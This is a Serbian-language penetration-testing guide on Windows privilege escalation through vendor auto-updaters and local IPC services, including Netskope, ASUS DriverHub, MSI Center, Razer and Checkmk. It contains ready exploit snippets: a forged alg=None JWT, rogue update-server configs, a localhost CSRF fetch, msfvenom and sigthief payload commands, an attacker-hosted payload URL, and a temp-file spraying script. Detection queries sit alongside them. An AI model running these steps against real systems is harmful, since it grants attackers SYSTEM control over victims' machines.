# Zloupotreba Enterprise Auto-Updaters i Privileged IPC (npr. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica generalizuje klasu Windows local privilege escalation lanaca pronađenih u enterprise endpoint agentima i updaters koji izlažu low-friction IPC površinu i privileged update flow. Reprezentativan primer je Netskope Client for Windows < R129 (CVE-2025-0309), gde low-privileged korisnik može da prinudi enrollment na server pod kontrolom napadača, a zatim isporuči zlonamerni MSI koji SYSTEM servis instalira.

Ključne ideje koje možete ponovo da iskoristite protiv sličnih proizvoda:
- Abuse privilegovanog service localhost IPC da biste prinudili re-enrollment ili reconfiguration na attacker server.
- Implement vendorove update endpointove, isporučite rogue Trusted Root CA, i usmerite updater na zlonamerni, „signed” paket.
- Zaobiđite slabe signer provere (CN allow-lists), opcionalne digest flags, i labave MSI properties.
- Ako je IPC „encrypted”, izvedite key/IV iz world-readable machine identifikatora sačuvanih u registry.
- Ako service ograničava pozivaoce po image path/process name, injektujte se u allow-listed process ili ga pokrenite suspended i bootstrap-ujte svoj DLL preko minimalnog thread-context patcha.

---
## 1) Prinudni enrollment na attacker server preko localhost IPC

Mnogi agenti isporučuju user-mode UI process koji komunicira sa SYSTEM service preko localhost TCP koristeći JSON.

Uočeno u Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Sastavite JWT enrollment token čiji claims kontrolišu backend host (npr. AddonUrl). Koristite alg=None tako da potpis nije potreban.
2) Pošaljite IPC poruku koja poziva provisioning command sa vašim JWT i tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Servis počinje da šalje zahteve tvom rogue serveru za enrollment/config, npr.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Napomene:
- Ako je caller verification zasnovan na path/name, pokreni zahtev iz allow-listed vendor binary-ja (vidi §4).

---
## 2) Hijacking update kanala za pokretanje koda kao SYSTEM

Kada client komunicira sa tvojim serverom, implementiraj očekivane endpoints i usmeri ga na attacker MSI. Tipičan sled:

1) /v2/config/org/clientconfig → Vrati JSON config sa veoma kratkim updater intervalom, npr.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Vrati PEM CA sertifikat. Servis ga instalira u Local Machine Trusted Root store.
3) /v2/checkupdate → Dostavi metapodatke koji ukazuju na malicious MSI i lažnu verziju.

Zaobilaženje uobičajenih provera viđenih u praksi:
- Signer CN allow-list: servis može da proverava samo da Subject CN bude “netSkope Inc” ili “Netskope, Inc.”. Tvoj rogue CA može izdati leaf sa tim CN i potpisati MSI.
- CERT_DIGEST property: uključi benign MSI property pod nazivom CERT_DIGEST. Nema enforcement-a pri instalaciji.
- Optional digest enforcement: config flag (npr. check_msi_digest=false) isključuje dodatnu kriptografsku validaciju.

Rezultat: SYSTEM servis instalira tvoj MSI iz
C:\ProgramData\Netskope\stAgent\data\*.msi
izvršavajući arbitrary code kao NT AUTHORITY\SYSTEM.

Lekcija o patch-bypass: ako vendor odgovori tako što allow-listuje mali skup “trusted” domena umesto da kriptografski autentifikuje update source, potraži vendor-owned redirectors ili reverse proxije koji i dalje dopuštaju da usmeravaš traffic. U Netskope-ovom slučaju, javno follow-up research je pokazao da se R129-era allow-list i dalje mogao zloupotrebiti kroz `rproxy.goskope.com`, koji je proxy-ovao attacker-controlled Azure App Service content. Tretiraj hostname allow-lists kao usporivač, ne kao trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

Od R127, Netskope je umotavao IPC JSON u encryptData polje koje izgleda kao Base64. Reverse engineering je pokazao AES sa key/IV izvedenim iz registry vrednosti koje može da čita bilo koji user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers mogu da reprodukuju enkripciju i šalju važeće encrypted komande iz standard user naloga. Opšti savet: ako agent odjednom “encrypts” svoj IPC, traži device IDs, product GUIDs, install IDs pod HKLM kao materijal.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Neki servisi pokušavaju da autentifikuju peer tako što razreše PID TCP konekcije i uporede image path/name sa allow-listovanim vendor binary-jem koji se nalazi pod Program Files (npr. stagentui.exe, bwansvc.exe, epdlp.exe).

Dva praktična bypass-a:
- DLL injection u allow-listovani process (npr. nsdiag.exe) i proxy IPC iznutra.
- Pokreni allow-listovani binary suspended i bootstrapuj svoj proxy DLL bez CreateRemoteThread (vidi §5) da bi zadovoljio driver-enforced tamper pravila.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Proizvodi često isporučuju minifilter/OB callbacks driver (npr. Stadrv) da ukloni opasna prava sa handle-ova ka protected procesima:
- Process: uklanja PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ograničava na THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Pouzdan user-mode loader koji poštuje ova ograničenja:
1) CreateProcess vendor binary-ja sa CREATE_SUSPENDED.
2) Dobavi handle-ove koje i dalje smeš da koristiš: PROCESS_VM_WRITE | PROCESS_VM_OPERATION nad procesom, i thread handle sa THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ili samo THREAD_RESUME ako patch-uješ code na poznatom RIP-u).
3) Prepiši ntdll!NtContinue (ili drugi rani, garantovano mapirani thunk) malim stub-om koji poziva LoadLibraryW nad path-om tvoje DLL, pa zatim skače nazad.
4) ResumeThread da aktiviraš svoj stub unutar procesa, učitavajući tvoju DLL.

Pošto nikada nisi koristio PROCESS_CREATE_THREAD ili PROCESS_SUSPEND_RESUME nad već protected procesom (ti si ga kreirao), driver-ova politika je zadovoljena.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatizuje rogue CA, malicious MSI signing i servira potrebne endpoint-e: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope je custom IPC client koji craft-uje arbitrary (opciono AES-encrypted) IPC poruke i uključuje suspended-process injection da bi potekle iz allow-listovanog binary-ja.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Kada se suočiš sa novim endpoint agentom ili motherboard “helper” paketom, brzi workflow je obično dovoljan da pokaže da li gledaš u obećavajući privesc target:

1) Enumeriši loopback listener-e i mapiraj ih nazad na vendor procese:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Nabroji kandidat named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Iskopaj routing podatke podržane registrijem koje koriste IPC serveri zasnovani na pluginovima:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Prvo izdvoj nazive endpointa, JSON ključeve i command IDs iz user-mode klijenta. Packed Electron/.NET frontendi često otkrivaju punu šemu:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Tražite stvarni trust predicate, a ne samo code path koji na kraju pokreće proces:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Obrasci koje vredi prioritetno tražiti:
- `CryptQueryObject`/parsiranje sertifikata bez `WinVerifyTrust` obično znači da je „sertifikat postoji” tretirano kao „sertifikat je trusted”, što omogućava certificate cloning ili druge fake-signer trikove.
- Provere podniza/sufiksa nad `Origin`, `Referer`, download URL-ovima, imenima procesa ili CN-ovima potpisnika nisu autentikacija. `contains(".vendor.com")` je obično exploitable pomoću domena sličnih napadačevim, nad kojima napadač ima kontrolu.
- Ako low-privileged GUI odlučuje „datoteka je trusted”, a SYSTEM broker samo koristi taj rezultat, patchovanje ili ponovna implementacija client-side DLL/JS često zaobilazi granicu u potpunosti (Razer-style split validation).
- Ako broker kopira payload u `%TEMP%`/`C:\Windows\Temp`, pa ga zatim validira ili zakazuje iz te putanje, odmah testiraj TOCTOU replacement windows i sibling plugin module koji izlažu alternativne `ExecuteTask()` wrapper-e sa slabijim proverama.

Za mete koje mnogo koriste named-pipe, PipeViewer je brz način da otkriješ slabe DACL-ove i pipe-ove dostupne na daljinu pre nego što kreneš da detaljno reverse-uješ protocol.

Ako target autentifikuje pozivače samo po PID-u, image path-u ili process name-u, tretiraj to kao speed bump, a ne kao granicu: ubacivanje u legitimnog klijenta, ili uspostavljanje konekcije iz procesa na allow-listi, često je dovoljno da zadovolji serverove provere. Za named pipes posebno, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) detaljnije pokriva ovaj primitive.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

Novija varijacija koju vredi loviti je **signed-client RPC broker**: low-privileged Lenovo-signed desktop process razgovara sa SYSTEM servisom, a servis rutira JSON komande u skup XML-opisanih add-inova ispod `%ProgramData%`. Kada se postigne code execution **unutar bilo kog prihvaćenog signed client-a**, svaki `runas="system"` contract postaje deo attack surface-a.

High-value primitives primećeni u Lenovo Vantage research:
- **Poveravanje caller-u zato što je potpisan od strane vendora**: istraživači su došli do authenticated context-a kopiranjem Lenovo-signed EXE u writable direktorijum i zadovoljavajući DLL side-load (`profapi.dll`), tako da je arbitrary code radio unutar klijenta kojem je servis već verovao.
- **Manifest-driven attack surface discovery**: add-inovi se definišu u `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; nekoliko contract-a radi kao `SYSTEM`, pa enumerisanje tih manifest-a često otkriva stvarne privileged verbs brže nego reverse-ovanje samog broker-a.
- **Per-command bugs iza authenticated channel-a**: jednom kad si unutar trusted client-a, javna istraživanja su našla path-traversal + race conditions u update/install verbs, raw-SQL abuse u privilegovanim settings bazama, i substring-based proveru registry path-ova koja je omogućavala upis van predviđenog hive-a.

Korisni recon na target-u:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Praktični zaključak: kad god helper suite izlaže broker koji prvo autentifikuje **caller process** i tek onda prosleđuje desetine plugin/add-in komandi, nemoj stati nakon zaobilaženja front-door trust provere. Ispumpaj manifest/contract tabelu i fuzzuj svaki high-privilege verb nezavisno; authenticated channel obično krije nekoliko second-stage bugs.

---
## 1) Browser-to-localhost CSRF protiv privileged HTTP APIs (ASUS DriverHub)

DriverHub isporučuje user-mode HTTP servis (ADU.exe) na 127.0.0.1:53000 koji očekuje browser pozive koji dolaze sa https://driverhub.asus.com. Origin filter jednostavno radi `string_contains(".asus.com")` nad Origin headerom i nad download URL-ovima izloženim preko `/asus/v1.0/*`. Svaki host pod kontrolom napadača kao što je `https://driverhub.asus.com.attacker.tld` zato prolazi proveru i može da šalje state-changing requests iz JavaScript-a. Pogledaj [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) za dodatne bypass obrasce.

Praktični tok:
1) Registruj domen koji sadrži `.asus.com` i hostuj zlonamernu web stranicu tamo.
2) Koristi `fetch` ili XHR da pozoveš privileged endpoint (npr. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Pošalji JSON body koji handler očekuje – upakovani frontend JS prikazuje šemu ispod.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Čak i PowerShell CLI prikazan ispod uspeva kada je Origin header spoofovan na poverenu vrednost:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Svaki posetilac browser-a na sajtu napadača zato postaje 1-click (ili 0-click preko `onload`) local CSRF koji pokreće SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` preuzima proizvoljne executables definisane u JSON body-ju i kešira ih u `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Validacija download URL-a ponovo koristi istu substring logiku, pa je `http://updates.asus.com.attacker.tld:8000/payload.exe` prihvaćen. Nakon preuzimanja, ADU.exe samo proverava da PE sadrži signature i da Subject string odgovara ASUS pre pokretanja – bez `WinVerifyTrust`, bez chain validation.

Da bi se flow weaponize-ovao:
1) Napravite payload (npr. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klonirajte ASUS-ov signer u njega (npr. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostujte `pwn.exe` na `.asus.com` domain-u koji liči na original i triggerujte UpdateApp preko browser CSRF iznad.

Pošto su i Origin i URL filteri bazirani na substring-u, a provera signer-a poredi samo stringove, DriverHub povlači i izvršava attacker binary pod svojim elevated context-om.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center-ov SYSTEM service izlaže TCP protocol gde je svaki frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Core component (Component ID `0f 27 00 00`) isporučuje `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Njegov handler:
1) Kopira dostavljeni executable u `C:\Windows\Temp\MSI Center SDK.exe`.
2) Proverava signature preko `CS_CommonAPI.EX_CA::Verify` (certificate subject mora biti “MICRO-STAR INTERNATIONAL CO., LTD.” i `WinVerifyTrust` mora uspeti).
3) Kreira scheduled task koji pokreće temp file kao SYSTEM sa attacker-controlled arguments.

Kopirani fajl nije zaključan između verifikacije i `ExecuteTask()`. Napadač može:
- Da pošalje Frame A koji pokazuje na legitimni MSI-signed binary (garantuje da signature check prođe i da se task zakaže).
- Da ga race-uje ponovljenim Frame B porukama koje pokazuju na malicious payload, čime se `MSI Center SDK.exe` overwrite-uje odmah nakon što verifikacija završi.

Kada scheduler okine, izvršiće overwrite-ovani payload pod SYSTEM iako je originalni fajl bio validiran. Pouzdana eksploatacija koristi dve goroutine/thread-ove koji spam-uju CMD_AutoUpdateSDK dok se TOCTOU window ne osvoji.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Svaki plugin/DLL koji učitava `MSI.CentralServer.exe` dobija Component ID sačuvan pod `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Prva 4 bajta frame-a biraju taj component, što napadačima omogućava da rutiraju komande ka proizvoljnim modulima.
- Plugins mogu definisati svoje task runner-e. `Support\API_Support.dll` izlaže `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i direktno poziva `API_Support.EX_Task::ExecuteTask()` bez **signature validation** – bilo koji local user može da ga usmeri na `C:\Users\<user>\Desktop\payload.exe` i deterministički dobije SYSTEM execution.
- Sniffing loopback-a pomoću Wireshark-a ili instrumentacija .NET binary-ja u dnSpy brzo otkriva Component ↔ command mapping; custom Go/ Python clients zatim mogu replay-ovati frame-ove.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) izlaže `\\.\pipe\treadstone_service_LightMode`, a njegov discretionary ACL dozvoljava remote client-ove (npr. `\\TARGET\pipe\treadstone_service_LightMode`). Slanje command ID `7` sa file path-om poziva service-ovu routine za pokretanje procesa.
- Client library serializuje magic terminator byte (113) zajedno sa args. Dynamic instrumentation sa Frida/`TsDotNetLib` (vidi [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) za instrumentation savete) pokazuje da native handler mapira ovu vrednost na `SECURITY_IMPERSONATION_LEVEL` i integrity SID pre poziva `CreateProcessAsUser`.
- Zamena 113 (`0x71`) sa 114 (`0x72`) pada u generic branch koji zadržava puni SYSTEM token i postavlja high-integrity SID (`S-1-16-12288`). Spawn-ovani binary zato radi kao unrestricted SYSTEM, i lokalno i cross-machine.
- Kombinujte to sa exposed installer flag-om (`Setup.exe -nocheck`) da podignete ACC čak i na lab VM-ovima i iskoristite pipe bez vendor hardware-a.

Ove IPC greške pokazuju zašto localhost services moraju da sprovode mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filtere, token filtering) i zašto svaki helper za “run arbitrary binary” u svakom modulu mora da deli iste signer verifikacije.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 je dodao još jedan koristan obrazac ovoj familiji: korisnik sa niskim privilegijama može da zamoli COM helper da pokrene proces kroz `RzUtility.Elevator`, dok je trust decision prebačen na user-mode DLL (`simple_service.dll`) umesto da bude robusno enforced unutar privileged boundary-ja.

Posmatrana exploatation putanja:
- Instancirajte COM object `RzUtility.Elevator`.
- Pozovite `LaunchProcessNoWait(<path>, "", 1)` da zatražite elevated launch.
- U javnom PoC-u, PE-signature gate unutar `simple_service.dll` se patch-uje pre slanja request-a, što omogućava pokretanje proizvoljnog executable-a izabranog od strane napadača.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Opšti zaključak: kada reversirate “helper” pakete, ne zaustavljajte se na localhost TCP ili named pipes. Proverite COM klase sa imenima kao što su `Elevator`, `Launcher`, `Updater`, ili `Utility`, zatim proverite da li privilegovani servis zaista validira sam ciljni binary ili samo veruje rezultatu koji je izračunao patchable user-mode client DLL. Ovaj obrazac se generalizuje dalje od Razer-a: svaki split design gde high-privilege broker koristi allow/deny odluku sa low-privilege strane je kandidat za privesc surface.


---
## Predictable temp script execution during MSI repair (Checkmk Agent / CVE-2024-0670)

Neki Windows agenti i dalje implementiraju privilegovane akcije tako što upisuju privremeni `.cmd` u `C:\Windows\Temp` i izvršavaju ga kao `SYSTEM`. Ako je filename predvidljiv i servis ne rekreira bezbedno postojeće fajlove, low-privileged korisnik može unapred da kreira budući temp fajl kao **read-only** i natera privilegovani proces da izvrši attacker-controlled sadržaj umesto sopstvenog script-a.

Uočeno u vulnerable Checkmk Agent buildovima:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: MSI **repair** keširanog agent package-a

Praktični workflow:
1. Proceni realističan PID range na osnovu trenutnih process ID-jeva ili PID-a pokrenutog agenta.
2. Napiši kratak **ASCII** `.cmd` payload (`Set-Content -Encoding Ascii` ili `cmd.exe` redirection; izbegavaj UTF-16 PowerShell output za batch fajlove).
3. Spray `C:\Windows\Temp\cmk_all_<PID>_1.cmd` preko kandidatnog range-a i obeleži svaki fajl kao read-only.
4. Triggeruj repair keširanog MSI-ja tako da privilegovani servis pokuša da regeneriše, a zatim izvrši temp script.
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Ako je ranjivi proizvod instaliran pomoću Windows Installer-a, mapiraj nasumično izgledaјуći keširani MSI u `C:\Windows\Installer` nazad na njegovo ime proizvoda pre nego što pokreneš repair:
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operational notes:
- `qwinsta` je koristan kada `msiexec /fa` ne uspe iz non-interactive WinRM shella i treba da utvrdite da li postojeća desktop/disconnected sesija može pravilno da pokrene repair.
- Ovaj obrazac se generalizuje na druge endpoint agente i updatere koji **staging temp skripti rade u world-writable lokacijama i kasnije ih izvršavaju kao SYSTEM**. Testirajte predvidive nazive, nedostatak exclusive create semantike i repair/update tokove koji mogu da se pokrenu on demand.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Između juna 2025. i decembra 2025, napadači koji su kompromitovali hosting infrastrukturu iza Notepad++ update flow-a selektivno su servirali malicious manifests izabranim žrtvama. Stariji WinGUp-based updaters nisu u potpunosti verifikovali autentičnost update-a, pa je hostile XML response mogao da preusmeri klijente na URL-ove pod kontrolom napadača. Pošto je klijent prihvatao HTTPS content bez nametanja i trusted certificate chain i validnog PE signature na preuzetom installer-u, žrtve su preuzimale i izvršavale trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: kompromitovati CDN/hosting i odgovoriti na update checks sa attacker metadata koji pokazuje na malicious download URL.
2. **Trojanized NSIS**: installer fetch-uje/izvršava payload i zloupotrebljava dva execution chain-a:
- **Bring-your-own signed binary + sideload**: ubaciti potpisani Bitdefender `BluetoothService.exe` i postaviti malicious `log.dll` u njegov search path. Kada signed binary radi, Windows sideloads `log.dll`, koji dekriptuje i reflektivno učitava Chrysalis backdoor (Warbird-protected + API hashing da bi se otežala statička detekcija).
- **Scripted shellcode injection**: NSIS izvršava kompajlirani Lua script koji koristi Win32 APIs (npr. `EnumWindowStationsW`) da ubaci shellcode i stage-uje Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** preuzetog installer-a (pin vendor signer, reject mismatched CN/chain) i potpišite sam update manifest (npr. XMLDSig). Block manifest-controlled redirects unless validated.
- Tretirajte **BYO signed binary sideloading** kao post-download detection pivot: alertujte kada potpisani vendor EXE učitava DLL ime izvan svoje canonical install path (npr. Bitdefender učitava `log.dll` iz Temp/Downloads) i kada updater drop-uje/izvršava installere iz temp sa non-vendor signatures.
- Pratite **malware-specific artifacts** uočene u ovom chain-u (korisno kao generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, i Lua-driven shellcode injection stages.
- Notepad++ je odgovorio jačanjem WinGUp u v8.8.9 i kasnije: vraćeni XML je sada potpisan (XMLDSig), a novije verzije nameću certificate + signature verification preuzetog installer-a umesto da veruju samo transportu.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> pokreće instalacioni program koji nije Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ovi obrasci se mogu generalizovati na svaki updater koji prihvata unsigned manifeste ili ne uspeva da pin-uje installere potpisivače—network hijack + malicious installer + BYO-signed sideloading daje remote code execution pod izgovorom “trusted” update-a.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
